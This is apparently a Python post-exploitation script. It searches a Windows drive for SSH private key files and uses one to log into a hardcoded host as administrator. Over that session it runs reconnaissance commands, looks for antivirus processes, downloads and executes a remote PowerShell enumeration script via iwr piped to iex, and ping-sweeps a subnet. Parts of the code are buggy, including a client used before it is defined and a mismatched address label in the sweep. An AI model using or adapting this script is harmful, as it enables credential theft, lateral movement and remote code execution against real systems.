import os
import paramiko
import io

directory = "C:\\"

ssh_file_extensions = [".ppk",".key",".pem",".cer"]

for root, dirs,files in os.walk(directory):
	for filename in files:
		if any(filename.endswith(ext) for ext in ssh_file_extensions):
			if("keys" in os.path.join(root,filename)):
				print(os.path.join(root,filename))
				path = os.path.join(root,filename)

ssh_host = "192.168.1.101"
user = "administrator"

private_key = paramiko.RSAKey.from_private_key_file(path)

ssh_client_w = paramiko.SSHClient()
try:
	ssh_client.connect(ssh_host,username=user)
except Exception:
	print("failed to connect without key")


ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh_client.connect(ssh_host,username=user,pkey=private_key)

stdin, stdout, stderr = ssh_client.exec_command("whoami")
for line in stdout:
	print(line.strip())
	
stdin, stdout, stderr = ssh_client.exec_command("whoami /Groups")
for line in stdout:
	print(line.strip())

stdin, stdout, stderr = ssh_client.exec_command("get-process | ?{$_.Description -like \"*virus*\"}")
for line in stdout:
	print(line.strip())



stdin, stdout, stderr = ssh_client.exec_command("powershell -command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr https://raw.githubusercontent.com/absolomb/WindowsEnum/master/WindowsEnum.ps1 | iex;\"")
stdout = io.TextIOWrapper(stdout,encoding='utf-8', errors='ignore')
for line in stdout:
	try:
		print(line.strip())
	except:
		print("")

stdin, stdout, stderr = ssh_client.exec_command("powershell -command \"1..256 | % {\\\"10.10.10.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)\\\"}\"")
for line in stdout:
	print(line.strip())
a = input("a")
ssh_client.close()
